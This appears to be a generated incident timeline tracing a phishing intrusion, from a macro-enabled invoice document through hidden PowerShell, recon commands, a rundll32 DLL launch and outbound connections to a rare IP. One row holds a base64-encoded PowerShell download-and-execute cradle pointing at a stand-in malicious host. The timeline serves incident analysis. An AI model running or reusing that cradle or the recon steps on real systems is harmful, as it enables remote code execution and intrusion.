# Generated Timeline

| Timestamp | Source | Event | Details |
|---|---|---|---|
| 2026-04-18 08:43:11 | alert | Suspicious Attachment Delivered | Invoice-themed email with macro-enabled attachment delivered to mailbox |
| 2026-04-18 08:45:49 | endpoint | WINWORD.EXE | C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE C:\\Users\\jcecil\\Downloads\\Invoice_April_2026.docm |
| 2026-04-18 08:47:02 | alert | Office Spawned PowerShell | WINWORD.EXE launched powershell.exe |
| 2026-04-18 08:47:02 | endpoint | powershell.exe | powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcABzADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AZABvAG0AYQBpAG4ALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA= |
| 2026-04-18 08:47:06 | endpoint | cmd.exe | cmd.exe /c whoami && ipconfig |
| 2026-04-18 08:47:10 | alert | Encoded PowerShell Command | PowerShell launched with -enc parameter |
| 2026-04-18 08:47:12 | endpoint | rundll32.exe | rundll32.exe C:\\Users\\Public\\update.dll,Start |
| 2026-04-18 08:48:01 | alert | Outbound Connection to Rare IP | Connection to 185.88.101.42 over port 443 |
| 2026-04-18 08:48:01 | firewall | network_connection | ALLOW connection to 185.88.101.42:443 |
| 2026-04-18 08:48:17 | firewall | network_connection | ALLOW connection to 185.88.101.42:443 |
| 2026-04-18 08:49:03 | firewall | network_connection | ALLOW connection to 104.18.32.11:443 |
| 2026-04-18 08:55:30 | alert | User Reported Suspicious Email | User called help desk after system behavior changed |
| 2026-04-18 09:02:40 | endpoint | chrome.exe | chrome.exe https://portal.company.local |
